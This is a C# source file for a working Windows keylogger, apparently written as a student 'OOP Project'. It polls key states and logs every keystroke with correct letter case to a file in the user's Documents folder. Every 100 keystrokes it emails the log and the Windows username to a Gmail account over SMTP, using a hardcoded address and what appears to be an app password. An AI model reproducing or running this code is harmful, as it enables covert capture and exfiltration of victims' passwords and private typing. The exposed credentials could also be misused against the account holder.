using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        static long numberOfKeystrokes = 0;
        static string path;

        static void Main(string[] args)
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            path = Path.Combine(folderPath, "keystrokes.txt");

            if (!File.Exists(path)) { File.Create(path).Dispose(); }

            Console.WriteLine("Logger is active. Case-sensitivity enabled.");

            while (true)
            {
                Thread.Sleep(10);

                for (int i = 8; i < 127; i++)
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        string keyToPrint = "";

                        bool isShiftDown = (GetKeyState(0x10) & 0x8000) != 0;
                        bool isCapsLockOn = (GetKeyState(0x14) & 0x0001) != 0;

                        if (i >= 65 && i <= 90)
                        {
                            bool makeUppercase = isCapsLockOn ^ isShiftDown;
                            keyToPrint = makeUppercase ? ((char)i).ToString() : ((char)(i + 32)).ToString();
                        }
                        else
                        {
                            switch (i)
                            {
                                case 32: keyToPrint = " "; break; 
                                case 13: keyToPrint = Environment.NewLine; break; 
                                case 8: keyToPrint = "[BACK]"; break; 
                                case 9: keyToPrint = "[TAB]"; break;
                                default:
                                    keyToPrint = ((char)i).ToString();
                                    break;
                            }
                        }

                        if (!string.IsNullOrEmpty(keyToPrint))
                        {
                            File.AppendAllText(path, keyToPrint);
                            Console.Write(keyToPrint);
                            numberOfKeystrokes++;

                            if (numberOfKeystrokes > 0 && numberOfKeystrokes % 100 == 0)
                            {
                                SendNewMessage();
                            }
                        }
                    }
                }
            }
        }

        static void SendNewMessage()
        {
            try
            {
                if (!File.Exists(path)) return;

                string logContents = File.ReadAllText(path);
                if (string.IsNullOrEmpty(logContents)) return;

                string emailBody = $"--- Log Report ---\n";
                emailBody += $"User: {Environment.UserName}\n";
                emailBody += $"Time: {DateTime.Now}\n\n";
                emailBody += logContents;

                using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
                {
                    client.EnableSsl = true;
                    client.UseDefaultCredentials = false;

                    client.Credentials = new NetworkCredential("yamur.5516@gmail.com", "vojr crti lrni qsex");

                    using (MailMessage mail = new MailMessage())
                    {
                        mail.From = new MailAddress("yamur.5516@gmail.com");
                        mail.To.Add("yamur.5516@gmail.com");
                        mail.Subject = "OOP Project: Case-Sensitive Log";
                        mail.Body = emailBody;

                        client.Send(mail);
                        Console.WriteLine("\n[System] Email sent successfully.");
                    }
                }

                File.WriteAllText(path, string.Empty);
            }
            catch (Exception ex)
            {
                Console.WriteLine("\n[Email Error] " + ex.Message);
            }
        }
    }
}